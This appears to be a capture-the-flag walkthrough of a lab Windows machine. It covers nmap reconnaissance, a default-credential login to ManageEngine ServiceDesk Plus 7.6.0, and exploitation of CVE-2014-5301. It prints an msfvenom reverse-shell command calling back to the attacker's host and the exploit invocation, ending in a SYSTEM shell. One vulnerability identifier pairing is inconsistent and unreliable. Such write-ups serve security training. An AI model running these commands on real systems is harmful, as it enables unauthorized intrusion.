Target IP: 192.168.197.43

Keep it simple and enumerate, you will be fine without overcomplications.

Reconnaissance


There are five TCP ports open on the target machine, as shown above.



Performing an aggressive nmap scan returns the results above. It looks like the target machine is running Windows Server 2008 SP1.


Using the nmap flag --script=vuln, I obtained the crucial information about the target machine. It looks like the target is vulnerable to ms10-054 and it has a CVE id of CVE-2009-3103. Before exploiting this, I wish to enumerate the different ports first.

Enumeration

Port 8080: HTTP

The webpage above is shown for the web application on port 8080. The target is running ManageEngine ServiceDesk Plus | 7.6.0 on this port.


I found the default credentials for this application. And using the credentials administrator:administrator, I gained access to the web application. The webpage above is displayed after logging in successfully. Now I have the credentials, I looked for ways to exploit the machine.


It looks like this application version is vulnerable to directory traversal attack. I found the exploit above at Github. I downloaded this exploit on my machine. Time to exploit the machine.

Exploitation & Flag


The exploit I found contains the description above. I followed the steps above to exploit the machine.


I generated the Java WAR shell using the command msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.228 LPORT=8443 -f war > shell.war. Then I started a listener on port 8443.


Then I ran the exploit using the command python3 CVE-2014-5301.py 192.168.197.43 8080 administrator administrator shell.war against the web application at port 8080 on the target machine using the default credentials.


After firing the exploit, I gained a reverse shell connection on my machine at port 8443. Now I have a foothold on the target machine. This exploit spawned the session as nt authority\system, so I do not need to perform privilege escalation.


Then I found the flag at Desktop of user Administrator.
